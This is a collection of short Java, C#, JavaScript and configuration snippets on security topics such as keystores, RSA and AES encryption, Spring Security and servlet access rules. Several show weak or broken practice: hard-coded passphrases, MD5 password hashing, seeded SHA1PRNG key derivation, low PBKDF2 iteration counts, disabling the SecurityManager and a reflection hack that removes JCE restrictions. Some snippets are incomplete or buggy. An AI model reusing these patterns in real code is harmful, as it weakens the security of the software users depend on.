    470                              final Object[] params) 
    471         throws PrivilegedActionException, 
    472                IllegalAccessException,
    473                InvocationTargetException {
    474                                  
    475     if (SecurityUtil.isPackageProtectionEnabled()){
    476        return AccessController.doPrivileged(new PrivilegedExceptionAction(){
    477             public Object run() throws IllegalAccessException, InvocationTargetException{
    478                 return method.invoke(context,  params);
    479             }
    480         });
    481     } else {
    482         return method.invoke(context, params);
    483     }        
    484 }
---UNIQUEIDFORSNIP---|130033028|    keytool -importkeystore -srckeystore myKeystore.jks -destkeystore myKeystore.p12 
    -deststoretype PKCS12 -srcalias someAlias -srcstorepass 12345678 -deststorepass 
    1122334455 -destkeypass 1122334455    
---UNIQUEIDFORSNIP---|130047202|    KeyStore.getInstance("UBER", "SC");
---UNIQUEIDFORSNIP---|130363220|    String md5 = DigestUtils.md5Hex(id);
    // or
    byte[] md5 = DigestUtils.md5(id);
---UNIQUEIDFORSNIP---|130385921|    PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);
    String safeHTML = policy.sanitize(untrustedHTML);
---UNIQUEIDFORSNIP---|130391948|    keytool -genkey -alias myalias -keystore mykeystore.jks -dname "CN=www.example.com"
---UNIQUEIDFORSNIP---|130391954|    keytool -genkey -alias myalias -keystore mykeystore.jks -dname "CN=www.example.com" -ext san=dns:www.example.com
---UNIQUEIDFORSNIP---|130391958|    keytool -export myservercert.crt -alias myalias -keystore mykeystore.jks
---UNIQUEIDFORSNIP---|130868034|    <constant name="struts.enable.DynamicMethodInvocation" value="false"/>
---UNIQUEIDFORSNIP---|130949493|    public class AuthExceptionEntryPoint implements AuthenticationEntryPoint
    {
    	@Override
    	public void commence(HttpServletRequest request, HttpServletResponse response, AuthenticationException arg2) throws IOException, ServletException
    	{
    		final Map<String, Object> mapBodyException = new HashMap<>() ;
            
            mapBodyException.put("error"    , "Error from AuthenticationEntryPoint") ;
            mapBodyException.put("message"  , "Message from AuthenticationEntryPoint") ;
            mapBodyException.put("exception", "My stack trace exception") ;
            mapBodyException.put("path"     , request.getServletPath()) ;
            mapBodyException.put("timestamp", (new Date()).getTime()) ;
            
    		response.setContentType("application/json") ;
            response.setStatus(HttpServletResponse.SC_UNAUTHORIZED) ;
            
            final ObjectMapper mapper = new ObjectMapper() ;
            mapper.writeValue(response.getOutputStream(), mapBodyException) ;
    	}
    }
---UNIQUEIDFORSNIP---|130949497|    @Configuration
    @EnableResourceServer
    public class ResourceServerConfiguration extends ResourceServerConfigurerAdapter
    {	
        @Override
        public void configure(HttpSecurity http) throws Exception
        {
        	http.exceptionHandling().authenticationEntryPoint(new AuthExceptionEntryPoint()) ;
    
        }
    }
---UNIQUEIDFORSNIP---|131258786|    String serial = UUID.randomUUID().toString().toUpperCase();
	System.out.println(serial);
---UNIQUEIDFORSNIP---|131276360|     if (currentUser.isAuthenticated()) {  
          if (currentUser.hasRole("admin")) {
              response.sendRedirect("app/admin/adminpage.jsp");
          }
          else if (currentUser.hasRole("student") || currentUser.hasRole("admin")) {           
             response.sendRedirect("app/student/studentpage.jsp");         
          }
         else if (currentUser.hasRole("teacher") || currentUser.hasRole("admin")) {      
             response.sendRedirect("app/teacher/teacherpage.jsp");
         }
      } 
     else {
             response.sendRedirect("app/login.jsp");
       }
---UNIQUEIDFORSNIP---|131442799|    try {
    final String imageURL = "http://www.google.com/intl/en_ALL/images/logo.gif";
    URL url = (URL) AccessController.doPrivileged(new PrivilegedAction() {
    public Object run() 
    {
        try
 {
     return new URL(imageURL);
---UNIQUEIDFORSNIP---|131442812|    try 
    {
        final String imageURL = "http://www.google.com/intl/en_ALL/images/logo.gif";
        URL url = (URL) AccessController.doPrivileged(new PrivilegedAction() 
        {
        
            public Object run() 
            {
                try
                {
                    return new URL(imageURL);
                }
                catch (MalformedURLException e)
                {
                    e.printStackTrace();
                    return null;
                }
      
            }  
        });  
        
        if(url == null)
        {
             // Something is wrong notify the user
        }
        else
        {
             // We know the url is good so continue on
              img = ImageIO.read(url);
        }
     
    } 
    catch (IOException e) 
    {
        System.out.println(e);
    }  
---UNIQUEIDFORSNIP---|131442814|    import java.applet.Applet;
    import java.awt.*;
    import java.awt.image.*;
    import javax.imageio.*;
    import javax.swing.*;
    import java.io.IOException;
    import java.net.*;
    import java.security.AccessController;
    import java.security.PrivilegedAction;
    public class LoadImageApp extends Applet
    {
      private BufferedImage img;
      private final String imageURL = "http://www.google.com/intl/en_ALL/images/logo.gif";
      public void init()
      {
        loadImage();
      }
      public void paint(Graphics g)
      {
        if (null != img) { g.drawImage(img, 0, 0, null); }
      }
      public void loadImage()
      {
        URL url = (URL) AccessController.doPrivileged(new PrivilegedAction()
        {
          public Object run()
          {
            try
            {
            	return new URL(imageURL);
            }
            catch (Exception e) { e.printStackTrace(); }
            return null;
          }
        });
    
        try {
	    	img = ImageIO.read(url);
	    } catch (IOException e) {
		e.printStackTrace();
	    }
      }
    }
---UNIQUEIDFORSNIP---|131475415|    @Autowired
	public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {
		auth.authenticationProvider(new ApiCustomAuthenticationProvider());
	}
---UNIQUEIDFORSNIP---|131475417|    auth.authenticationProvider(apiCustomAuthenticationProvider())
---UNIQUEIDFORSNIP---|131475419|    List<GrantedAuthority> grantedAuths = new ArrayList<GrantedAuthority>();
	grantedAuths.add(new SimpleGrantedAuthority("ROLE_USER"));
    UsernamePasswordAuthenticationToken("aman", "12345",grantedAuths) ;
---UNIQUEIDFORSNIP---|131584127|    @Configuration
    @EnableWebMvc
    public class Api extends WebMvcConfigurationSupport {
    
        @Override
        public RequestMappingHandlerMapping requestMappingHandlerMapping() {
            RequestMappingHandlerMapping mapping = super.requestMappingHandlerMapping();
            mapping.setUseSuffixPatternMatch(false);
            return mapping;
        }
    
    }
---UNIQUEIDFORSNIP---|131784160|    Throwable unrollException(Throwable exception, Class<? extends Throwable> expected){
        
        while(exception != null && exception != exception.getCause()){
            if(expected.isInstance(exception)){
              return exception;
            }
            exception = exception.getCause();
        }
        return null;
    }
---UNIQUEIDFORSNIP---|132080273|    SecureRandom sr = SecureRandom.getInstance("SHA1PRNG");
		sr.setSeed(seed);
	    kgen.init(128, sr); // 192 and 256 bits may not be available
	    SecretKey skey = kgen.generateKey();
---UNIQUEIDFORSNIP---|132259975|    public static RSACryptoServiceProvider DecodeX509PublicKey(byte[] x509key)
    {
        byte[] SeqOID = { 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01 };
        MemoryStream ms = new MemoryStream(x509key);
        BinaryReader reader = new BinaryReader(ms);
        if (reader.ReadByte() == 0x30)
            ReadASNLength(reader); //skip the size
        else
            return null;
        int identifierSize = 0; //total length of Object Identifier section
        if (reader.ReadByte() == 0x30)
            identifierSize = ReadASNLength(reader);
        else
            return null;
        if (reader.ReadByte() == 0x06) //is the next element an object identifier?
        {
            int oidLength = ReadASNLength(reader);
            byte[] oidBytes = new byte[oidLength];
            reader.Read(oidBytes, 0, oidBytes.Length);
            if (oidBytes.SequenceEqual(SeqOID) == false) //is the object identifier rsaEncryption PKCS#1?
                return null;
            int remainingBytes = identifierSize - 2 - oidBytes.Length;
            reader.ReadBytes(remainingBytes);
        }
        if (reader.ReadByte() == 0x03) //is the next element a bit string?
        {
            ReadASNLength(reader); //skip the size
            reader.ReadByte(); //skip unused bits indicator
            if (reader.ReadByte() == 0x30)
            {
                ReadASNLength(reader); //skip the size
                if (reader.ReadByte() == 0x02) //is it an integer?
                {
                    int modulusSize = ReadASNLength(reader);
                    byte[] modulus = new byte[modulusSize];
                    reader.Read(modulus, 0, modulus.Length);
                    if (modulus[0] == 0x00) //strip off the first byte if it's 0
                    {
                        byte[] tempModulus = new byte[modulus.Length - 1];
                        Array.Copy(modulus, 1, tempModulus, 0, modulus.Length - 1);
                        modulus = tempModulus;
                    }
                    if (reader.ReadByte() == 0x02) //is it an integer?
                    {
                        int exponentSize = ReadASNLength(reader);
                        byte[] exponent = new byte[exponentSize];
                        reader.Read(exponent, 0, exponent.Length);
                        RSACryptoServiceProvider RSA = new RSACryptoServiceProvider();
                        RSAParameters RSAKeyInfo = new RSAParameters();
                        RSAKeyInfo.Modulus = modulus;
                        RSAKeyInfo.Exponent = exponent;
                        RSA.ImportParameters(RSAKeyInfo);
                        return RSA;
                    }
                }
            }
        }
        return null;
    }
    public static int ReadASNLength(BinaryReader reader)
    {
        //Note: this method only reads lengths up to 4 bytes long as
        //this is satisfactory for the majority of situations.
        int length = reader.ReadByte();
        if ((length & 0x00000080) == 0x00000080) //is the length greater than 1 byte
        {
            int count = length & 0x0000000f;
            byte[] lengthBytes = new byte[4];
            reader.Read(lengthBytes, 4 - count, count);
            Array.Reverse(lengthBytes); //
            length = BitConverter.ToInt32(lengthBytes, 0);
        }
        return length;
    }
---UNIQUEIDFORSNIP---|132259978|    X509Certificate2 cert = new X509Certificate2(certificateFile, certificatePassword, X509KeyStorageFlags.Exportable | X509KeyStorageFlags.PersistKeySet);
    RSACryptoServiceProvider provider1 = (RSACryptoServiceProvider)cert.PublicKey.Key;
    RSACryptoServiceProvider provider2 = (RSACryptoServiceProvider)cert.PrivateKey;
---UNIQUEIDFORSNIP---|132259980|    KeyStore keystore = KeyStore.getInstance("PKCS12");
    keystore.load(new FileInputStream(certificateFile), certificatePassword.toCharArray());
    Key key = keystore.getKey(certName, certificatePassword.toCharArray());
    Certificate cert = keystore.getCertificate(certName);
    PublicKey publicKey = cert.getPublicKey();
    KeyPair keys = new KeyPair(publicKey, (PrivateKey) key);
---UNIQUEIDFORSNIP---|132343699|    Signature.getInstance("SHA256withRSA", "BC");
---UNIQUEIDFORSNIP---|132343701|     new BouncyCastleProvier()
---UNIQUEIDFORSNIP---|132491472|    private byte[] EncryptSecretKey ()
    {
        Cipher cipher = null;
        byte[] key = null;
        try
        {
            // initialize the cipher with the user's public key
            cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
            cipher.init(Cipher.ENCRYPT_MODE, contact.getPublicKey() );
            key = cipher.doFinal(skey.getEncoded());
        }
        catch(Exception e )
        {
            System.out.println ( "exception encoding key: " + e.getMessage() );
            e.printStackTrace();
        }
        return key;
    }
---UNIQUEIDFORSNIP---|132491474|    private SecretKey decryptAESKey(byte[] data )
    {
        SecretKey key = null;
        PrivateKey privKey = null;
        Cipher cipher = null;
        
        try
        {
            // this is OUR private key
            privKey = (PrivateKey)utility.loadLocalKey(
                                    ConfigFrame.privateKeyLocation, false);
        
            // initialize the cipher...
            cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
            cipher.init(Cipher.DECRYPT_MODE, privKey );
                
            // generate the aes key!
            key = new SecretKeySpec ( cipher.doFinal(data), "AES" );
        }
        catch(Exception e)
        {
            System.out.println ( "exception decrypting the aes key: " 
                                                   + e.getMessage() );
            return null;
        }
            
        return key;
    }
---UNIQUEIDFORSNIP---|132570049|    if(request.getUserPrincipal() != null && request.isUserInRole("admin"))
---UNIQUEIDFORSNIP---|132776118|    String modulusString = "hm2oRCtP6usJKYpq7o1K20uUuL11j5xRrbV4FCQhn/JeXLT21laKK9901P69YUS3bLo64x8G1PkCfRtjbbZCIaa1Ci/BCQX8nF2kZVfrPyzcmeAkq4wsDthuZ+jPInknzUI3TQPAzdj6gim97E731i6WP0MHFqW6ODeQ6Dsp8pc=";
    String publicExponentString = "AQAB";
    
    byte[] modulusBytes = Base64.decodeBase64(modulusString);
    byte[] exponentBytes = Base64.decodeBase64(publicExponentString);
    BigInteger modulus = new BigInteger(1, modulusBytes);
    BigInteger publicExponent = new BigInteger(1, exponentBytes);
    
    RSAPublicKeySpec rsaPubKey = new RSAPublicKeySpec(modulus, publicExponent);
    KeyFactory fact = KeyFactory.getInstance("RSA");
    PublicKey pubKey = fact.generatePublic(rsaPubKey);
    Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1PADDING");
    cipher.init(Cipher.ENCRYPT_MODE, pubKey);
    
    byte[] plainBytes = clearTextPassword.getBytes("UTF-16LE");
    byte[] cipherData = cipher.doFinal(plainBytes);
    String encryptedStringBase64 = Base64.encodeBase64String(cipherData);
---UNIQUEIDFORSNIP---|132976245|    <context-param> 
    <param-name>com.sun.faces.sendPoweredByHeader</param-name> 
    <param-value>false</param-value> 
    </context-param>
---UNIQUEIDFORSNIP---|133157813|    Calendar expiry = Calendar.getInstance();
    expiry.set(2010, 1, 31,0,0); // Expire at 31 Jan 2010
    Calendar now = Calendar.getInstance();
    // If you don't trust client's clock, fetch time from some reliable time server
    if( now.after(expiry)){
    // Exit with proper expiry message
    }
    else
    { 
    // let the customer enjoy your software
    } 
---UNIQUEIDFORSNIP---|133384802|    <session-config>
     <cookie-config>
      <http-only>true</http-only>
     </cookie-config>
    <session-config>
---UNIQUEIDFORSNIP---|133390578|    BigInteger modulus = new BigInteger(Base64.getDecoder().decode(modulusAsString));
    BigInteger exponent =  new BigInteger(Base64.getDecoder().decode(exponentAsString));
    RSAPublicKeySpec keySpec = new RSAPublicKeySpec(modulus, exponent);
    KeyFactory keyFactory = KeyFactory.getInstance("RSA");
    PublicKey pubKey =keyFactory.generatePublic(keySpec);
---UNIQUEIDFORSNIP---|133440151|    @Controller
    @RequestMapping("/books")
    public class BooksController {
    
      @RequestMapping("read")
      @Secured("ROLE_READER")
      public ModelAndView read(int id) { ... }
      @RequestMapping("canRead")
      @Secured("ROLE_READER")
      public void canRead() { }
    
      @RequestMapping("write")
      @Secured("ROLE_WRITER")
      public ModelAndView write(int id, String contents) { ... }
      @RequestMapping("canWrite")
      @Secured("ROLE_WRITER")
      public void canWrite() { }
    }
---UNIQUEIDFORSNIP---|133442638|    sig.update(data);
---UNIQUEIDFORSNIP---|133467070|	<context-param>
	    <param-name>shiroConfigLocations</param-name>
	    <param-value>classpath:auth.ini</param-value>
	</context-param>
	
	<!--  Shiro Environment Listener -->
	<listener>
		<listener-class>org.apache.shiro.web.env.EnvironmentLoaderListener</listener-class>
	</listener>
	
	<!--  Shiro Filter Configuration -->
	<filter>
		<filter-name>ShiroFilter</filter-name>
		<filter-class>org.apache.shiro.web.servlet.ShiroFilter</filter-class>
	</filter>
	<filter-mapping>
		<filter-name>ShiroFilter</filter-name>
		<url-pattern>/*</url-pattern>
	</filter-mapping>
---UNIQUEIDFORSNIP---|133627054|    String token = (String) session.getAttribute(Globals.TRANSACTION_TOKEN_KEY);
    if (token != null) {
      results.append("<input type=\"hidden\" name=\"");
      results.append(Constants.TOKEN_KEY);
      results.append("\" value=\"");
      results.append(token);
      if (this.isXhtml()) {
          results.append("\" />");
      } else {
         results.append("\">");
      }
    }
---UNIQUEIDFORSNIP---|133838340|    public static String decrypt(String hexEncoded) throws Exception {
       byte[] decodedBytes = hexStringToBytes(hexEncoded);
       int ivIndex = decodedBytes.length - 16;
       cipher.init(Cipher.DECRYPT_MODE, encryptionKey,
           new IvParameterSpec(decodedBytes, ivIndex, 16));
       return reconstructedPlainText(cipher.doFinal(decodedBytes, 0, ivIndex));
    }
---UNIQUEIDFORSNIP---|133970366|    .antMatchers("/secure/**").access("hasRole('ADMIN')")
    .requiresChannel().anyRequest().requiresSecure()
---UNIQUEIDFORSNIP---|133976068|    public static void main(String args[]) throws Exception{
        
        String password = "Secret Passphrase";
        String salt = "222f51f42e744981cf7ce4240eeffc3a";
        String iv = "2b69947b95f3a4bb422d1475b7dc90ea";
        String encrypted = "CQVXTPM2ecOuZk+9Oy7OyGJ1M6d9rW2D/00Bzn9lkkehNra65nRZUkiCgA3qlpzL";
            
        byte[] saltBytes = hexStringToByteArray(salt);
        byte[] ivBytes = hexStringToByteArray(iv);
        IvParameterSpec ivParameterSpec = new IvParameterSpec(ivBytes);        
        SecretKeySpec sKey = (SecretKeySpec) generateKeyFromPassword(password, saltBytes);
        System.out.println( decrypt( encrypted , sKey ,ivParameterSpec));
    }
        
    public static SecretKey generateKeyFromPassword(String password, byte[] saltBytes) throws GeneralSecurityException {
        
        KeySpec keySpec = new PBEKeySpec(password.toCharArray(), saltBytes, 100, 128);
        SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
        SecretKey secretKey = keyFactory.generateSecret(keySpec);
        
        return new SecretKeySpec(secretKey.getEncoded(), "AES");
    }
    
    public static byte[] hexStringToByteArray(String s) {
        
        int len = s.length();
        byte[] data = new byte[len / 2];
        
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i+1), 16));
        }
        
        return data;
    }
    
    public static String decrypt(String encryptedData, SecretKeySpec sKey, IvParameterSpec ivParameterSpec) throws Exception { 
                 
        Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
        c.init(Cipher.DECRYPT_MODE, sKey, ivParameterSpec);
        byte[] decordedValue = new BASE64Decoder().decodeBuffer(encryptedData);
        byte[] decValue = c.doFinal(decordedValue);
        String decryptedValue = new String(decValue);
        
        return decryptedValue;
    }
 
---UNIQUEIDFORSNIP---|133976070|    function  generateKey(){
        var salt = CryptoJS.lib.WordArray.random(128/8);
        var iv = CryptoJS.lib.WordArray.random(128/8);
        console.log('salt  '+ salt );
        console.log('iv  '+ iv );
        var key128Bits100Iterations = CryptoJS.PBKDF2("Secret Passphrase", salt, { keySize: 128/32, iterations: 100 });
        console.log( 'key128Bits100Iterations '+ key128Bits100Iterations);
        var encrypted = CryptoJS.AES.encrypt("Message", key128Bits100Iterations, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7  });
    }
    
    function  decrypt(){
        var salt = CryptoJS.enc.Hex.parse("4acfedc7dc72a9003a0dd721d7642bde");
        var iv = CryptoJS.enc.Hex.parse("69135769514102d0eded589ff874cacd");
        var encrypted = "PU7jfTmkyvD71ZtISKFcUQ==";
        var key = CryptoJS.PBKDF2("Secret Passphrase", salt, { keySize: 128/32, iterations: 100 });
        console.log( 'key '+ key);
        var decrypt = CryptoJS.AES.decrypt(encrypted, key, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 });
        var ddd = decrypt.toString(CryptoJS.enc.Utf8); 
        console.log('ddd '+ddd);
    }
---UNIQUEIDFORSNIP---|133990117|    	@Override
	public void checkPackageAccess(String pkg) {
		super.checkPackageAccess(pkg);
		System.out.println("checkPackageAccess.." + pkg);
		if (!accessOK()) {
			if (pkg.startsWith("my.specialpackage.path")) {
				throw new SecurityException("No access to " + pkg);
			}
		}
	}
---UNIQUEIDFORSNIP---|134056856|-----BEGIN CERTIFICATE-----
---UNIQUEIDFORSNIP---|134056860|-----END CERTIFICATE-----
---UNIQUEIDFORSNIP---|134056863|openssl x509 -in cacerts.pem -text
---UNIQUEIDFORSNIP---|134116541|    WifiManager wifi = (WifiManager) getSystemService(Context.WIFI_SERVICE);
    List<ScanResult> networkList = wifi.getScanResults();
    if (networkList != null) {
        for (ScanResult network : networkList)
        {
            String Capabilities =  network.capabilities;        
            Log.w (TAG, network.SSID + " capabilities : " + Capabilities);
        }
    }
---UNIQUEIDFORSNIP---|134252451|    System.setSecurityManager(null);
---UNIQUEIDFORSNIP---|134252453|    <security>
      <all-permissions/>
    </security>
---UNIQUEIDFORSNIP---|134415565|    -vmargs
    -Djava.net.preferIPv4Stack
---UNIQUEIDFORSNIP---|134604457|    sign.update(encoded);
---UNIQUEIDFORSNIP---|134604459|    sign.update(data.getBytes());
---UNIQUEIDFORSNIP---|134923438|    String.format("%02x",(byteData[i] & 0xff))
---UNIQUEIDFORSNIP---|134923473|    Integer.toString((byteData[i] & 0xff) + 0x100, 16).substring(1))
---UNIQUEIDFORSNIP---|134923478|    String.format("%02x",byteData[i])
---UNIQUEIDFORSNIP---|134936771|    TextView tv1; 
    TextView tv2; 
    TextView tv3; 
    Button convert; 
    String publicKeyFilename = null; 
    String privateKeyFilename = null; 
    String ST = "Ebenezersawesome"; 
     
    @Override public void onCreate(Bundle savedInstanceState) 
    { 
        super.onCreate(savedInstanceState); 
        setContentView(R.layout.main); 
        Log.d("Ebz", "Made it to onCreate"); 
        tv1 = (TextView) findViewById(R.id.tv1); 
        tv2 = (TextView) findViewById(R.id.tv2); 
        tv3 = (TextView) findViewById(R.id.tv3); 
        convert = (Button) findViewById(R.id.button1); 
    
        try { 
                    byte[]plainText = "ST".getBytes("UTF8"); 
                    Log.d("Ebz", "made it to Try Block"); 
                    KeyPairGenerator keyGen = 
                        KeyPairGenerator.getInstance("RSA"); 
                    keyGen.initialize(4096); 
                    KeyPair key = keyGen.generateKeyPair(); 
                    Cipher cipher = 
                        Cipher.getInstance("RSA/ECB/PKCS1Padding"); 
                    tv3.setText(cipher.getProvider().getInfo().toString()); 
                    //tv3.setText(ST); 
                    cipher.init(Cipher.ENCRYPT_MODE, key.getPublic()); 
                    byte[]cipherText = cipher.doFinal(plainText); 
                    tv1.setText(new String(cipherText, "UTF8").toString()); 
                    //tv1.setText(ST); 
                    byte[]newPlainText = cipher.doFinal(cipherText); 
                    tv2.setText(new String(newPlainText, "UTF8").toString()); 
                    //tv2.setText(ST); 
                } catch(Exception e) { 
                    System.out.println("error"); 
                }
        // tv2.setText(ST); 
        convert.setOnClickListener(new OnClickListener() { 
            public void onClick(View v) { 
                Log.d("Ebz", "Made it to onCreate");  
            } 
        }); 
    }
---UNIQUEIDFORSNIP---|134950141|          File inputFile = (File) AccessController.doPrivileged(new PrivilegedAction() {
          public Object run() 
          {
             File inputFile1 = new File("C:\\Program Files\\MyFolder\\MyFile.jpg");
             return inputFile1;
          }
          });
      FileReader in = new FileReader(inputFile);
---UNIQUEIDFORSNIP---|134950143|    final String myfilename = <path or string var of filename>
    File inputFile = (File) AccessController.doPrivileged(new PrivilegedAction() {
          public Object run() 
          {
             File inputFile1 = new File(myfilename);
          }
        }};
    FileReader in = new FileReader(inputFile);
---UNIQUEIDFORSNIP---|135327571|    <http auto-config="true">
    <intercept-url pattern="/**" access="ROLE_ADMIN"/>
    <form-login login-processing-url="/j_spring_security_check" 
        login-page="/views/login.xhtml" 
        default-target-url="/views/index.xhtml"
        authentication-failure-url="/views/error.xhtml" />
    </http>
---UNIQUEIDFORSNIP---|135334607|    System.setSecurityManager(null);
---UNIQUEIDFORSNIP---|135334612|    context.setLoader(new WebappLoader(getClass().getClassLoader()));
---UNIQUEIDFORSNIP---|135428948|    Jsoup.clean(richTextArea.getValue(), Whitelist.simpleText())
---UNIQUEIDFORSNIP---|135454603|    jarsigner myBundle.jar susan
    jarsigner myBundle.jar kevin
---UNIQUEIDFORSNIP---|135454607|    SUSAN.SF
    SUSAN.DSA
    KEVIN.SF
    KEVIN.DSA
---UNIQUEIDFORSNIP---|135466973|     md5(password+"{"+salt+"}")
---UNIQUEIDFORSNIP---|135486235|    public class PrintASCIIChar {
	    public static void main(String[] args) {
		   String str = "7289";
		   String c = Character.toString((char)Integer.parseInt(str.substring(0, 2)));
		   System.out.println("Printing: " + c);
	    }
    }
---UNIQUEIDFORSNIP---|135853422|    //path to private key file
    String PRIVATE_KEY_FILE_RSA = "C:\\Users\\Adey";
    FileInputStream in = new FileInputStream(PRIVATE_KEY_FILE_RSA);
    // passphrase - the key to decode private key
    String passphrase = "somepass";
    PKCS8Key pkcs8 = new PKCS8Key(in, passphrase.toCharArray());
    byte[] decrypted = pkcs8.getDecryptedBytes();
    PKCS8EncodedKeySpec spec = new PKCS8EncodedKeySpec(decrypted);
    RSAPrivateKey privKey = (RSAPrivateKey) KeyFactory.getInstance("RSA").generatePrivate(spec);
---UNIQUEIDFORSNIP---|135948123|            public class MyAuthenticationPlugin extends SimpleAuthenticationPlugin {
                private String  username ="username";
                private String  password ="password";
                private String  groups = "groups";
                Map<String, String> userPasswords = new HashMap<String, String>();
                List<AuthenticationUser> authenticationUserList = new ArrayList();
                public MyAuthenticationPlugin(){
                    secureME();
                }
                public void secureME(){
                    userPasswords.put(username, password);
                    authenticationUserList.add(new AuthenticationUser(username,password, groups));
                    this.setUserPasswords(userPasswords);
                    this.setUsers(authenticationUserList);
                }
       }
---UNIQUEIDFORSNIP---|135948235|    <servlet>
    <servlet-name>MySTSService</servlet-name>
    <servlet-class>MySTSService</servlet-class>
    <load-on-startup>0</load-on-startup>
    </servlet>
---UNIQUEIDFORSNIP---|135948237|    <servlet>
    <servlet-name>MySTSService</servlet-name>
    <servlet-class>com.sun.xml.ws.transport.http.servlet.WSServlet</servlet-class>
    <load-on-startup>0</load-on-startup>
    </servlet>
---UNIQUEIDFORSNIP---|135954014|    huc.setDoOuput(true);
    huc.setUseCaches(false);
---UNIQUEIDFORSNIP---|135954018|    huc.setDoInput(true);
---UNIQUEIDFORSNIP---|136149017|    put("Cipher.AES", "foo.bar.AESCipher");
---UNIQUEIDFORSNIP---|136176133|    POST /openam/json/sessions?_action=getSessionInfo HTTP/1.1
    Host: myserver.com:8080
    Content-Type: application/json
    Cookie: iPlanetDirectoryPro=... <-- added by browser, not in code
    Accept-API-Version: protocol=1.0,resource=2.0
    Cache-Control: no-cache
    
    {}
---UNIQUEIDFORSNIP---|136176136|    {
        "username": "demo",
        "universalId": "id=demo,ou=user,dc=openam,dc=forgerock,dc=org",
        "realm": "/",
        "latestAccessTime": "2017-09-28T20:15:17Z",
        "maxIdleExpirationTime": "2017-09-28T20:45:17Z",
        "maxSessionExpirationTime": "2017-09-28T22:15:16Z",
        "properties": {}
    }
---UNIQUEIDFORSNIP---|136294573|    private static void removeCryptographyRestrictions() {
        if (!isRestrictedCryptography()) {
            return;
        }
        try {
            java.lang.reflect.Field isRestricted;
            try {
                final Class<?> c = Class.forName("javax.crypto.JceSecurity");
                isRestricted = c.getDeclaredField("isRestricted");
            } catch (final ClassNotFoundException e) {
                try {
                    // Java 6 has obfuscated JCE classes
                    final Class<?> c = Class.forName("javax.crypto.SunJCE_b");
                    isRestricted = c.getDeclaredField("g");
                } catch (final ClassNotFoundException e2) {
                    throw e;
                }
            }
            isRestricted.setAccessible(true);
            isRestricted.set(null, false);
        } catch (final Throwable e) {
            logger.log(Level.WARNING,
                    "Failed to remove cryptography restrictions", e);
        }
    }
    private static boolean isRestrictedCryptography() {
        return "Java(TM) SE Runtime Environment"
                .equals(System.getProperty("java.runtime.name"));
    }
---UNIQUEIDFORSNIP---|136328305|    <HTML>
    <HEAD>
    <TITLE>Your Webclient</TITLE>
    <META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
    </HEAD>
    <BODY>
    <applet name="yourclientname" width="765" height="503" archive="client.jar" code="client.class">
    <param name="java_arguments" value="-Xmx1024m">
    </applet>
    </BODY>
    </HTML>
---UNIQUEIDFORSNIP---|136430586|    package guestbook;
    import java.io.IOException;
    import javax.servlet.http.*;
    import com.google.appengine.api.users.User;
    import com.google.appengine.api.users.UserService;
    import com.google.appengine.api.users.UserServiceFactory;
    public class GuestbookServlet extends HttpServlet {
        public void doGet(HttpServletRequest req, HttpServletResponse resp)
              throws IOException {
            UserService userService = UserServiceFactory.getUserService();
            User user = userService.getCurrentUser();
            if (user != null) {
                resp.setContentType("text/plain");
                if(userService.isUserAdmin()) {
                    resp.getWriter().println("Hello, " + user.getNickname() + ", you are logged in as an admin");
                } else {
                    resp.getWriter().println("Hello, " + user.getNickname());
                }
            } else {
                resp.sendRedirect(userService.createLoginURL(req.getRequestURI()));
            }
        }
    }
---UNIQUEIDFORSNIP---|136430590|    import java.io.IOException;
    import javax.servlet.http.HttpServlet;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import com.google.appengine.api.users.UserService;
    import com.google.appengine.api.users.UserServiceFactory;
    public class MyServlet extends HttpServlet {
        public void doGet(HttpServletRequest req, HttpServletResponse resp)
                throws IOException {
            UserService userService = UserServiceFactory.getUserService();
            String thisURL = req.getRequestURI();
            resp.setContentType("text/html");
            if (req.getUserPrincipal() != null) {
                resp.getWriter().println("<p>Hello, " +
                                     req.getUserPrincipal().getName() +
                                     "!  You can <a href=\"" +
                                     userService.createLogoutURL(thisURL) +
                                     "\">sign out</a>.</p>");
            } else {
                resp.getWriter().println("<p>Please <a href=\"" +
                                     userService.createLoginURL(thisURL) +
                                     "\">sign in</a>.</p>");
            } 
        }
    }
---UNIQUEIDFORSNIP---|136430594|    <security-constraint>
        <web-resource-collection>
            <url-pattern>/profile/*</url-pattern>
        </web-resource-collection>
        <auth-constraint>
            <role-name>*</role-name>
        </auth-constraint>
    </security-constraint>
    <security-constraint>
        <web-resource-collection>
            <url-pattern>/admin/*</url-pattern>
        </web-resource-collection>
        <auth-constraint>
            <role-name>admin</role-name>
        </auth-constraint>
    </security-constraint>
---UNIQUEIDFORSNIP---|136556706|    package com.example.trusted.launcher;
    
    import java.nio.charset.StandardCharsets;
    import java.nio.file.Files;
    import java.nio.file.Path;
    import java.nio.file.Paths;
    import java.security.Policy;
    import java.util.Collections;
    
    import com.example.trusted.security.DenyingPolicy;
    public class Launcher {
        public static void main(String... args) throws Exception {
    
            /*
             * Get the actual main application class, which has hopefully been loaded by a different ClassLoader,
             * and resides in a distinct package and ProtectionDomain.
             */
            Class<?> realMain = getMainFromArgs(args);
    
            // install a Policy and SecurityManager
    
            /*
             * To avoid having to administer .policy configurations at the file system, you could bundle a
             * template with your app/lib, replace any CodeSource URLs you don't know until runtime, temp-save
             * to the file system (or use some transient URLStreamHandler) and "feed" the corresponding URL to
             * the Policy provider. Or better yet, if you can spare the time, implement your own Policy provider
             * as a mutable data structure.
             */
            String policyConfig = new String(
                    Files.readAllBytes(Paths.get(Launcher.class.getResource("policy_template.txt").toURI())),
                    StandardCharsets.UTF_8);
        
            // replace any CodeSource URL placeholders (e.g. with realMain's cs URL)
            policyConfig = adjustPolicyConfig(policyConfig);
        
            // temp-save it and hand it over to Policy
